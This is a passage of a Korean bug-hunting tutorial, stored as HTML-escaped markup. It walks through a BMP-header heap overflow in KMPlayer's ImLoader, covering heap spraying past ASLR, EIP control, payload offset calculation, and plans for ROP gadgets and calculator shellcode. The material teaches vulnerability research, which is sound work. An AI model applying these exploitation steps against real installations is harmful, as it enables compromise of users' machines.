&lt;code&gt;BITMAPINFOHEADER&lt;/code&gt;&amp;#xB4A4;&amp;#xC5D0; &amp;#xD560;&amp;#xB2F9;&amp;#xB41C;&amp;#xB2E4;&amp;#xBA70;&amp;#x2026; &amp;#xC624;&amp;#xBC84;&amp;#xD50C;&amp;#xB85C;&amp;#xC6B0; &amp;#xC548; &amp;#xB09C;&amp;#xB2E4;&amp;#xBA70;&amp;#x2026;.)&lt;/p&gt;
&lt;p&gt;&amp;#xB4A4;&amp;#xC5D0; &amp;#xB354; &amp;#xBCF4;&amp;#xB3C4;&amp;#xB85D; &amp;#xD558;&amp;#xC8E0; &amp;#x314E;&amp;#x314E;&amp;#x314E;&amp;#x314E;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2021/03/31/l0ch/bughunting-tutorials-part4/image--054.jpg&#34; alt=&#34;bughunting-tutorials-part4/image--054.jpg&#34;&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xC774;&amp;#xC81C;&amp;#xB294; &lt;code&gt;this&lt;/code&gt; &amp;#xC5D0; &lt;code&gt;BITMAPINFOHEADER&lt;/code&gt; &amp;#xC815;&amp;#xBCF4;&amp;#xB97C; &amp;#xC800;&amp;#xC7A5;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xCC38; &amp;#xCC30;&amp;#xC9C0;&amp;#xAC8C; &amp;#xB2E4; &amp;#xB123;&amp;#xB124;&amp;#xC694;.&lt;br&gt;&amp;#xADF8;&amp;#xB9AC;&amp;#xACE0; &amp;#xB9C8;&amp;#xC9C0;&amp;#xB9C9;&amp;#xC5D0;&amp;#xB294; &amp;#xBAA8;&amp;#xB4E0; &amp;#xBE44;&amp;#xD2B8;&amp;#xB9F5; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xB97C; &amp;#xC800;&amp;#xC7A5;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC6B0;&amp;#xB9AC;&amp;#xB294; &amp;#xC775;&amp;#xC2A4;&amp;#xD50C;&amp;#xB85C;&amp;#xC787;&amp;#xC744; &amp;#xD560; &amp;#xB54C; &amp;#xC774; &amp;#xBD80;&amp;#xBD84;&amp;#xC744; &amp;#xC774;&amp;#xC6A9;&amp;#xD574;&amp;#xC11C; &amp;#xC2A4;&amp;#xD504;&amp;#xB808;&amp;#xC774;&amp;#xB97C; &amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4; &amp;#x314E;&amp;#x314E;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2021/03/31/l0ch/bughunting-tutorials-part4/image--056.jpg&#34; alt=&#34;bughunting-tutorials-part4/image--056.jpg&#34;&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xC774;&amp;#xC81C; &amp;#xCDE8;&amp;#xC57D;&amp;#xC810; &amp;#xBD80;&amp;#xBD84;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4; &amp;#x314E;&amp;#x314E;&amp;#x314E; &amp;#xB4DC;&amp;#xB514;&amp;#xC5B4; &amp;#x314E;&amp;#x314E;&lt;/p&gt;
&lt;p&gt;&amp;#xBA3C;&amp;#xC800; &amp;#xC5B4;&amp;#xB5A4; &amp;#xC8FC;&amp;#xC18C;&amp;#xB97C; &amp;#xACC4;&amp;#xC0B0;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. Header &amp;#xC8FC;&amp;#xC18C; &amp;#xAE30;&amp;#xC900;&amp;#xC73C;&amp;#xB85C; &lt;code&gt;size&lt;/code&gt; &amp;#xB9CC;&amp;#xD07C; &amp;#xB4A4;&amp;#xC5D0; &amp;#xC8FC;&amp;#xC18C;&amp;#xB97C; &amp;#xC800;&amp;#xC7A5;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xADF8;&amp;#xB7F0; &amp;#xB2E4;&amp;#xC74C; &amp;#xBC11;&amp;#xC5D0; &amp;#xBAA8;&amp;#xB4E0; &amp;#xBD84;&amp;#xAE30;&amp;#xB97C; &amp;#xAC74;&amp;#xB108;&amp;#xB6F0;&amp;#xACE0; &lt;code&gt;sub_41AAF0&lt;/code&gt; &amp;#xD568;&amp;#xC218;&amp;#xB85C; &amp;#xAC11;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC774; &amp;#xD568;&amp;#xC218;&amp;#xB294; &amp;#xD30C;&amp;#xC77C; &amp;#xC2A4;&amp;#xD2B8;&amp;#xB9BC;&amp;#xC5D0;&amp;#xC11C; &lt;code&gt;byte_4BA6F4[size_bool] * header-&amp;gt;biClrUsed = 0x800&lt;/code&gt; &amp;#xB9CC;&amp;#xD07C; &amp;#xC77D;&amp;#xC5B4;&amp;#xC11C; &amp;#xC704;&amp;#xC5D0;&amp;#xC11C; &amp;#xACC4;&amp;#xC0B0;&amp;#xD55C; &amp;#xC8FC;&amp;#xC18C;&amp;#xC5D0; &amp;#xC800;&amp;#xC7A5;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&amp;#xC5EC;&amp;#xAE30;&amp;#xC5D0;&amp;#xC11C; &amp;#xC624;&amp;#xBC84;&amp;#xD50C;&amp;#xB85C;&amp;#xC6B0;&amp;#xAC00; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;!!!! &amp;#xC544;&amp;#xAE4C; &amp;#xC704;&amp;#xC5D0;&amp;#xC11C; &amp;#xC598;&amp;#xAE30;&amp;#xD588;&amp;#xB4EF;&amp;#xC774; header &amp;#xC758; &amp;#xD06C;&amp;#xAE30;&amp;#xB294; &lt;code&gt;size+0x40c&lt;/code&gt;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4; &amp;#x314B;&amp;#x314B;&amp;#x314B; &amp;#xADFC;&amp;#xB370; &amp;#xC5EC;&amp;#xAE30;&amp;#xC5D0;&amp;#xC11C;&amp;#xB294; &lt;code&gt;header+size&lt;/code&gt; &amp;#xC5D0; &lt;code&gt;0x800&lt;/code&gt; &amp;#xBC14;&amp;#xC774;&amp;#xD2B8;&amp;#xB97C; &amp;#xD560;&amp;#xB2F9;&amp;#xD558;&amp;#xB2C8; &amp;#xB4A4;&amp;#xC5D0; &amp;#xC788;&amp;#xB294; &amp;#xAC1D;&amp;#xCCB4;&amp;#xB97C; &amp;#xB36E;&amp;#xAC8C; &amp;#xB418;&amp;#xB294; &amp;#xAC70;&amp;#xC8E0;!! &amp;#xADF8;&amp;#xB7FC; &amp;#xAC1D;&amp;#xCCB4;&amp;#xAC00; &amp;#xB36E;&amp;#xC774;&amp;#xAE30; &amp;#xC804;&amp;#xACFC; &amp;#xD6C4;&amp;#xB97C; &amp;#xD55C;&amp;#xBC88; &amp;#xC0B4;&amp;#xD3B4;&amp;#xBCFC;&amp;#xAC8C;&amp;#xC694;!!&lt;/p&gt;
&lt;p&gt;Before:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2021/03/31/l0ch/bughunting-tutorials-part4/image--058.png&#34; alt=&#34;bughunting-tutorials-part4/image--058.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;After:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2021/03/31/l0ch/bughunting-tutorials-part4/image--060.png&#34; alt=&#34;bughunting-tutorials-part4/image--060.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xD5E4;&amp;#xD5FF; &amp;#xC790; &amp;#xC774;&amp;#xC81C; &amp;#xADF8;&amp;#xB7FC; &lt;code&gt;eip&lt;/code&gt;&amp;#xB97C; &amp;#xC7A1;&amp;#xC744; &amp;#xC218; &amp;#xC788;&amp;#xACA0;&amp;#xB124;&amp;#xC694;!!!&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2021/03/31/l0ch/bughunting-tutorials-part4/image--062.png&#34; alt=&#34;bughunting-tutorials-part4/image--062.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xB124;&amp;#x2026;.? &amp;#xBB58; &amp;#xC7A1;&amp;#xB294;&amp;#xB2E4;&amp;#xB294; &amp;#xAC70;&amp;#xC8E0;&amp;#x2026;.? &amp;#xC96C;&amp;#xB975;&amp;#x2026;. &amp;#x3160;&amp;#x3160; &amp;#xD6C4;&amp;#xC6B0; &amp;#xC5ED;&amp;#xC2DC; &amp;#xC778;&amp;#xC0DD;&amp;#xC740; &amp;#xD5D8;&amp;#xB09C;&amp;#xD558;&amp;#xB124;&amp;#xC694;&amp;#x2026;&lt;/p&gt;
&lt;p&gt;&amp;#xC73C;&amp;#xC74C;&amp;#x2026; &amp;#xC774;&amp;#xC81C; &amp;#xB514;&amp;#xBC84;&amp;#xAE45;&amp;#xD574;&amp;#xBCF4;&amp;#xBA74;&amp;#xC11C; &amp;#xD558;&amp;#xB098;&amp;#xD558;&amp;#xB098; &amp;#xD574;&amp;#xACB0;&amp;#xD574; &amp;#xB098;&amp;#xAC08;&amp;#xAC8C;&amp;#xC694; &amp;#x3160;&amp;#x3160;&lt;br&gt;&amp;#xBA3C;&amp;#xC800; &lt;code&gt;0x11111111&lt;/code&gt; &amp;#xC5D0; Access violation&amp;#xC774; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD558;&amp;#xB294; &amp;#xAC83;&amp;#xC740; &amp;#xC6B0;&amp;#xB9AC;&amp;#xAC00; &amp;#xB123;&amp;#xC740; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xAC00; &amp;#xC720;&amp;#xD6A8;&amp;#xD55C; &amp;#xBA54;&amp;#xBAA8;&amp;#xB9AC;&amp;#xB97C; &amp;#xAC00;&amp;#xB9AC;&amp;#xD0A4;&amp;#xAC8C; &amp;#xD558;&amp;#xBA74; &amp;#xB418;&amp;#xACA0;&amp;#xC8E0;!! &amp;#xD558;&amp;#xC9C0;&amp;#xB9CC;!!! ASLR&amp;#xC774; &amp;#xAC78;&amp;#xB824;&amp;#xC788;&amp;#xC5B4;&amp;#xC11C; &amp;#xADF8;&amp;#xB807;&amp;#xAC8C; &amp;#xD558;&amp;#xB294; &amp;#xAC8C; &amp;#xC27D;&amp;#xC9C0; &amp;#xC54A;&amp;#xB2E4;&amp;#xB294; &amp;#xAC70;&amp;#x2026;. &amp;#xADF8;&amp;#xB807;&amp;#xAE30; &amp;#xB54C;&amp;#xBB38;&amp;#xC5D0; &amp;#xC2A4;&amp;#xD504;&amp;#xB808;&amp;#xC774;&amp;#xB97C; &amp;#xC9C4;&amp;#xD589;&amp;#xD574;&amp;#xC57C; &amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xB2E4;&amp;#xD589;&amp;#xD788;(??) KMPlayer&amp;#xC640; ImLoader&amp;#xAC00; 32 &amp;#xBE44;&amp;#xD2B8;&amp;#xB85C; &amp;#xCEF4;&amp;#xD30C;&amp;#xC77C;&amp;#xB418;&amp;#xC5B4; &amp;#xC788;&amp;#xAE30; &amp;#xB54C;&amp;#xBB38;&amp;#xC5D0; &amp;#xC2A4;&amp;#xD504;&amp;#xB808;&amp;#xC774;&amp;#xB97C; &amp;#xD558;&amp;#xBA74; &amp;#xC5B4;&amp;#xB290; &amp;#xC815;&amp;#xB3C4; &amp;#xB9B4;&amp;#xB77C;&amp;#xC774;&amp;#xC5B4;&amp;#xBE14;&amp;#xD558;&amp;#xAC8C; &amp;#xC6D0;&amp;#xD558;&amp;#xB294; &amp;#xC8FC;&amp;#xC18C;&amp;#xC5D0; &amp;#xBA54;&amp;#xBAA8;&amp;#xB9AC;&amp;#xB97C; &amp;#xB9E4;&amp;#xD551;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xD560;&amp;#xB2F9;&amp;#xD558;&amp;#xB294; &amp;#xBA54;&amp;#xBAA8;&amp;#xB9AC;&amp;#xC5D0; &amp;#xD06C;&amp;#xAE30;&amp;#xC5D0; &amp;#xB530;&amp;#xB77C;&amp;#xC11C; &amp;#xC790;&amp;#xC8FC; &amp;#xB9E4;&amp;#xD551;&amp;#xB418;&amp;#xB294; &amp;#xC8FC;&amp;#xC18C;&amp;#xAC00; &amp;#xB2EC;&amp;#xB77C;&amp;#xC9D1;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC800;&amp;#xB294; &amp;#xC5EC;&amp;#xAE30;&amp;#xC5D0;&amp;#xC11C; 150M &amp;#xC815;&amp;#xB3C4;&amp;#xB97C; 0x11&amp;#xB85C; &amp;#xC2A4;&amp;#xD504;&amp;#xB808;&amp;#xC774; &amp;#xD588;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &lt;/p&gt;
&lt;p&gt;150M&amp;#xB85C; &amp;#xC2A4;&amp;#xD504;&amp;#xB808;&amp;#xC774;&amp;#xD55C; &amp;#xC774;&amp;#xC720;&amp;#xB294; &amp;#xB514;&amp;#xBC84;&amp;#xAE45;&amp;#xD560; &amp;#xB54C; &amp;#xC774; &amp;#xC815;&amp;#xB3C4; &amp;#xD06C;&amp;#xAE30;&amp;#xAC00; &amp;#xAC00;&amp;#xC7A5; &amp;#xC801;&amp;#xB2F9;&amp;#xD55C; &amp;#xC18D;&amp;#xB3C4;&amp;#xAC00; &amp;#xB098;&amp;#xC640;&amp;#xC11C; &amp;#xC778;&amp;#xB370;&amp;#xC694;. &amp;#xB514;&amp;#xBC84;&amp;#xAE45;&amp;#xD560; &amp;#xB54C; &lt;code&gt;0x11111111&lt;/code&gt; &amp;#xC5D0; &amp;#xB9E4;&amp;#xD551;&amp;#xC774; &amp;#xC548;&amp;#xB418;&amp;#xBA74; &amp;#xB2E4;&amp;#xC2DC; &amp;#xC2DC;&amp;#xC791;&amp;#xD574;&amp;#xC11C; &amp;#xD14C;&amp;#xC2A4;&amp;#xD2B8;&amp;#xB97C; &amp;#xD574;&amp;#xC57C; &amp;#xB418;&amp;#xC796;&amp;#xC544;&amp;#xC694;? &amp;#xD06C;&amp;#xAE30;&amp;#xAC00; &amp;#xCEE4;&amp;#xC9C0;&amp;#xBA74; &amp;#xC6D0;&amp;#xD558;&amp;#xB294; &amp;#xC8FC;&amp;#xC18C;&amp;#xC5D0; &amp;#xB9E4;&amp;#xD551;&amp;#xC774; &amp;#xB354; &amp;#xC798;&amp;#xB418;&amp;#xC9C0;&amp;#xB9CC; &amp;#xC708;&amp;#xB3C4;&amp;#xC6B0;&amp;#xAC00; &amp;#xC5C5;&amp;#xB370;&amp;#xC774;&amp;#xD2B8;&amp;#xB97C; &amp;#xD558;&amp;#xBA74; &amp;#xD560;&amp;#xC218;&amp;#xB85D; &amp;#xB79C;&amp;#xB364; &amp;#xB9C8;&amp;#xC774;&amp;#xC9D5;&amp;#xC774; &amp;#xC798;&amp;#xB3FC;&amp;#xC11C; &amp;#xD06C;&amp;#xAE30;&amp;#xAC00; &amp;#xCEE4;&amp;#xB3C4; &amp;#xC798; &amp;#xC548;&amp;#xB418;&amp;#xB354;&amp;#xB77C;&amp;#xACE0;&amp;#xC694; &amp;#x3160;&amp;#x3160;(&amp;#xC608;&amp;#xC804;&amp;#xC5D0;&amp;#xB294; 300M &amp;#xB9CC; &amp;#xD574;&amp;#xB3C4; &amp;#xAC70;&amp;#xC758; &amp;#xACE0;&amp;#xC815;&amp;#xC774;&amp;#xB77C;&amp;#xACE0; &amp;#xB4E4;&amp;#xC5C8;&amp;#xB294;&amp;#xB370;&amp;#x2026;) &amp;#xAC00;&amp;#xC7A5; &amp;#xD6A8;&amp;#xC728;&amp;#xC801;&amp;#xC774;&amp;#xB77C;&amp;#xACE0; &amp;#xC0DD;&amp;#xAC01;&amp;#xD558;&amp;#xB294; &amp;#xD06C;&amp;#xAE30;&amp;#xB85C; &amp;#xD588;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xB9CC;&amp;#xC57D; &amp;#xC6D0;&amp;#xD558;&amp;#xB294; &amp;#xB370;&amp;#xB85C; &amp;#xC798; &amp;#xB41C;&amp;#xB2E4;&amp;#xBA74; &amp;#xC544;&amp;#xB798;&amp;#xC640; &amp;#xAC19;&amp;#xC774; &amp;#xD574;&amp;#xB2F9; &amp;#xC8FC;&amp;#xC18C;&amp;#xC5D0; &amp;#xC798; &amp;#xB9E4;&amp;#xD551;&amp;#xB41C; &amp;#xAC83;&amp;#xC744; &amp;#xBCFC; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;!!&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2021/03/31/l0ch/bughunting-tutorials-part4/image--064.png&#34; alt=&#34;bughunting-tutorials-part4/image--064.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xADF8;&amp;#xB9AC;&amp;#xACE0; &amp;#xC774;&amp;#xB300;&amp;#xB85C; &amp;#xC2E4;&amp;#xD589;&amp;#xD558;&amp;#xBA74;!!!&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2021/03/31/l0ch/bughunting-tutorials-part4/image--066.png&#34; alt=&#34;bughunting-tutorials-part4/image--066.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xC9DD;&amp;#xC9DD;&amp;#xC9DD;!! &lt;code&gt;eip&lt;/code&gt;&amp;#xB97C; &amp;#xC7A1;&amp;#xC558;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;!!! &amp;#xC18C;&amp;#xB9AC;&amp;#xC9C8;&amp;#xB7EC;&amp;#xC5B4;&amp;#xC5B4;&amp;#xC5B4;&amp;#xC5B4;&amp;#xC5B4;&amp;#xC5B4;!!!! (&amp;#xD558;&amp;#x2026; &amp;#xD5D8;&amp;#xB09C;&amp;#xD588;&amp;#xB2E4;&amp;#x2026;) &amp;#xC774;&amp;#xC81C; &amp;#xC775;&amp;#xC2A4;&amp;#xB9CC; &amp;#xD558;&amp;#xBA74; &amp;#xB418;&amp;#xACA0;&amp;#xB124;&amp;#xC694; &amp;#x314E;&amp;#x314E;&amp;#x314E;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&amp;#xC77C;&amp;#xB2E8; &amp;#xC5B4;&amp;#xB5BB;&amp;#xAC8C; &lt;code&gt;eip&lt;/code&gt;&amp;#xB97C; &amp;#xC7A1;&amp;#xAC8C; &amp;#xB418;&amp;#xC5C8;&amp;#xB294;&amp;#xC9C0; &amp;#xD568; &amp;#xBCFC;&amp;#xAC8C;&amp;#xC694;. &amp;#xC77C;&amp;#xB2E8; &amp;#xC2A4;&amp;#xD0DD;&amp;#xC5D0; &amp;#xC788;&amp;#xB294; &amp;#xB9AC;&amp;#xD134; &amp;#xC5B4;&amp;#xB4DC;&amp;#xB808;&amp;#xC2A4;&amp;#xB97C; &amp;#xD655;&amp;#xC778;&amp;#xD574;&amp;#xC11C; &amp;#xC5B4;&amp;#xB514;&amp;#xC5D0;&amp;#xC11C; &lt;code&gt;call&lt;/code&gt; &amp;#xD639;&amp;#xC740; &lt;code&gt;jmp&lt;/code&gt;&amp;#xB97C; &amp;#xD588;&amp;#xB294;&amp;#xC9C0; &amp;#xD655;&amp;#xC778;&amp;#xD574;&amp;#xBCFC;&amp;#xAC8C;&amp;#xC694;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2021/03/31/l0ch/bughunting-tutorials-part4/image--068.png&#34; alt=&#34;bughunting-tutorials-part4/image--068.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2021/03/31/l0ch/bughunting-tutorials-part4/image--070.png&#34; alt=&#34;bughunting-tutorials-part4/image--070.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xC2A4;&amp;#xD0DD;&amp;#xC5D0; &amp;#xC788;&amp;#xB294; &amp;#xB9C8;&amp;#xC9C0;&amp;#xB9C9; &amp;#xB9AC;&amp;#xD134; &amp;#xC5B4;&amp;#xB4DC;&amp;#xB808;&amp;#xC2A4;&amp;#xB97C; &amp;#xBCF4;&amp;#xB2C8; &lt;code&gt;ImLoader+0x357f&lt;/code&gt; &amp;#xC778; &amp;#xAC83;&amp;#xC744; &amp;#xD655;&amp;#xC778;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xACE0; &amp;#xC774; &amp;#xC8FC;&amp;#xC18C;&amp;#xBCF4;&amp;#xB2E4; &amp;#xC704;&amp;#xC5D0; &amp;#xC788;&amp;#xB294; instruction&amp;#xC744; &amp;#xD655;&amp;#xC778;&amp;#xD574;&amp;#xBCF4;&amp;#xBA74; &lt;code&gt;call dword ptr [ecx-4]&lt;/code&gt;&amp;#xC778; &amp;#xAC83;&amp;#xC744; &amp;#xD655;&amp;#xC778;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xADF8;&amp;#xB9AC;&amp;#xACE0; &lt;code&gt;ecx&lt;/code&gt;&amp;#xB294; &lt;code&gt;eax&lt;/code&gt;&amp;#xAC00; &amp;#xAC00;&amp;#xB9AC;&amp;#xD0A4;&amp;#xB294; &amp;#xBA54;&amp;#xBAA8;&amp;#xB9AC;&amp;#xC5D0;&amp;#xC11C; &amp;#xAC00;&amp;#xC838;&amp;#xC628; &amp;#xAC83;&amp;#xC774;&amp;#xB124;&amp;#xC694;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2021/03/31/l0ch/bughunting-tutorials-part4/image--072.png&#34; alt=&#34;bughunting-tutorials-part4/image--072.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xADF8;&amp;#xB7FC; &amp;#xC774;&amp;#xC81C; &amp;#xC911;&amp;#xC694;&amp;#xD55C; &amp;#xAC70;&amp;#xB294; &lt;code&gt;0x11111111&lt;/code&gt; &amp;#xC774; &amp;#xAC00;&amp;#xB9AC;&amp;#xD0A4;&amp;#xB294; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xAC00; &amp;#xD30C;&amp;#xC77C;&amp;#xC5D0;&amp;#xC11C;&amp;#xC758; &amp;#xC624;&amp;#xD504;&amp;#xC14B;(&amp;#xC704;&amp;#xCE58;??)&amp;#xC774; &lt;code&gt;eax&lt;/code&gt;&amp;#xAC00; &amp;#xAC00;&amp;#xB9AC;&amp;#xD0A4;&amp;#xB294; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xC758; &amp;#xC624;&amp;#xD504;&amp;#xC14B;&amp;#xC774; &amp;#xC77C;&amp;#xCE58;&amp;#xD558;&amp;#xB0D0;&amp;#xB294; &amp;#xAC83;&amp;#xC778;&amp;#xB370;&amp;#xC694;. &amp;#xC774; &amp;#xBD80;&amp;#xBD84;&amp;#xC744; &amp;#xD655;&amp;#xC778;&amp;#xD574;&amp;#xBCF4;&amp;#xAE30; &amp;#xC704;&amp;#xD574;&amp;#xC11C; &amp;#xC77C;&amp;#xB2E8; &lt;code&gt;0x11111111&lt;/code&gt; &amp;#xBD80;&amp;#xBD84;&amp;#xC774; &amp;#xC5B4;&amp;#xB5A4; &amp;#xC704;&amp;#xCE58;&amp;#xC5D0; &amp;#xC788;&amp;#xB294;&amp;#xC9C0; &amp;#xBCF4;&amp;#xACA0;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2021/03/31/l0ch/bughunting-tutorials-part4/image--074.jpg&#34; alt=&#34;bughunting-tutorials-part4/image--074.jpg&#34;&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xB9C8;&amp;#xC9C0;&amp;#xB9C9; &amp;#xBA54;&amp;#xBAA8;&amp;#xB9AC;&amp;#xAC00; &amp;#xC804;&amp;#xCCB4; &amp;#xBE44;&amp;#xD2B8;&amp;#xB9F5; &amp;#xC774;&amp;#xBBF8;&amp;#xC9C0;&amp;#xB97C; &amp;#xB2F4;&amp;#xACE0; &amp;#xC788;&amp;#xB294; &amp;#xBD80;&amp;#xBD84;&amp;#xC774;&amp;#xAE30; &amp;#xB54C;&amp;#xBB38;&amp;#xC5D0; &amp;#xD574;&amp;#xB2F9; &amp;#xBA54;&amp;#xBAA8;&amp;#xB9AC; &amp;#xAE30;&amp;#xC900;&amp;#xC73C;&amp;#xB85C; &amp;#xACC4;&amp;#xC0B0;&amp;#xD558;&amp;#xBA74; &amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;. &lt;code&gt;0x11111111 &amp;#x2013; 0x101cb056 = 0xF460BB&lt;/code&gt; &amp;#xB124;&amp;#xC694;. &amp;#xC55E;&amp;#xC5D0;&amp;#xC11C; &amp;#xAC1D;&amp;#xCCB4;&amp;#xB97C; &amp;#xB36E;&amp;#xC744; &amp;#xB54C;&amp;#xC5D0;&amp;#xB294; &amp;#xD30C;&amp;#xC77C; &amp;#xAE30;&amp;#xC900;&amp;#xC73C;&amp;#xB85C; &amp;#xC55E;&amp;#xBD80;&amp;#xBD84; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xB97C; &amp;#xAC00;&amp;#xC838;&amp;#xC640; &amp;#xBCF5;&amp;#xC0AC;&amp;#xD558;&amp;#xAE30; &amp;#xB54C;&amp;#xBB38;&amp;#xC5D0; &amp;#xD398;&amp;#xC774;&amp;#xB85C;&amp;#xB4DC;&amp;#xB97C; &amp;#xB2F4;&amp;#xB294; &amp;#xB370;&amp;#xC5D0;&amp;#xB294; &amp;#xD070; &amp;#xBB38;&amp;#xC81C;&amp;#xAC00; &amp;#xC5C6;&amp;#xC744; &amp;#xAC83; &amp;#xAC19;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;!!&lt;/p&gt;
&lt;p&gt;&amp;#xC790; &amp;#xC774;&amp;#xC81C; &amp;#xD398;&amp;#xC774;&amp;#xB85C;&amp;#xB4DC;&amp;#xB97C; &amp;#xC791;&amp;#xC131;&amp;#xD574;&amp;#xC57C; &amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xD398;&amp;#xC774;&amp;#xB85C;&amp;#xB4DC;&amp;#xB97C; &amp;#xC791;&amp;#xC131;&amp;#xD558;&amp;#xAE30; &amp;#xC804;&amp;#xC5D0; MONA&amp;#xC640; &amp;#xBA54;&amp;#xD0C0;&amp;#xC2A4;&amp;#xD50C;&amp;#xB85C;&amp;#xC787;&amp;#xC744; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD574;&amp;#xC11C; &amp;#xBAA8;&amp;#xB4C8;&amp;#xB4E4;&amp;#xC758; &amp;#xBBF8;&amp;#xD2F0;&amp;#xAC8C;&amp;#xC774;&amp;#xC158; &amp;#xC801;&amp;#xC6A9; &amp;#xD56D;&amp;#xBAA9;, &amp;#xD544;&amp;#xC694;&amp;#xD55C; &amp;#xAC00;&amp;#xC82F; &amp;#xAC80;&amp;#xC0C9;, &amp;#xC258; &amp;#xCF54;&amp;#xB4DC; &amp;#xC0DD;&amp;#xC131;&amp;#xC744; &amp;#xD574;&amp;#xC57C; &amp;#xD558;&amp;#xB294; &amp;#xB370; &amp;#xC774; &amp;#xBD80;&amp;#xBD84;&amp;#xC740; &amp;#xC778;&amp;#xD130;&amp;#xB137;&amp;#xC744; &amp;#xAC80;&amp;#xC0C9;&amp;#xD558;&amp;#xBA74; &amp;#xB9CE;&amp;#xC774; &amp;#xB098;&amp;#xC624;&amp;#xAE30; &amp;#xB54C;&amp;#xBB38;&amp;#xC5D0; &amp;#xC0DD;&amp;#xB7B5;&amp;#xD558;&amp;#xB3C4;&amp;#xB85D; &amp;#xD558;&amp;#xACA0;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xACB0;&amp;#xB860;&amp;#xC801;&amp;#xC73C;&amp;#xB85C; &lt;code&gt;KMPlayer.exe&lt;/code&gt; &amp;#xC5D0; Rebase&amp;#xAC00; &amp;#xC548; &amp;#xAC78;&amp;#xB824;&amp;#xC788;&amp;#xC5B4;&amp;#xC11C; &lt;code&gt;KMPlayer.exe&lt;/code&gt; &amp;#xC5D0; &amp;#xC788;&amp;#xB294; &amp;#xAC00;&amp;#xC82F;&amp;#xC744; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD558;&amp;#xB3C4;&amp;#xB85D; &amp;#xD560; &amp;#xAC83;&amp;#xC774;&amp;#xACE0;&amp;#xC694;, &amp;#xBA54;&amp;#xD0C0;&amp;#xC2A4;&amp;#xD50C;&amp;#xB85C;&amp;#xC787;&amp;#xC744; &amp;#xD1B5;&amp;#xD574;&amp;#xC11C;&amp;#xB294; &amp;#xACC4;&amp;#xC0B0;&amp;#xAE30;&amp;#xB97C; &amp;#xC2E4;&amp;#xD589;&amp;#xC2DC;&amp;#xD0A4;&amp;#xB294; &amp;#xC258; &amp;#xCF54;&amp;#xB4DC;&amp;#xB97C; &amp;#xB9CC;&amp;#xB4E4; &amp;#xAC83;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
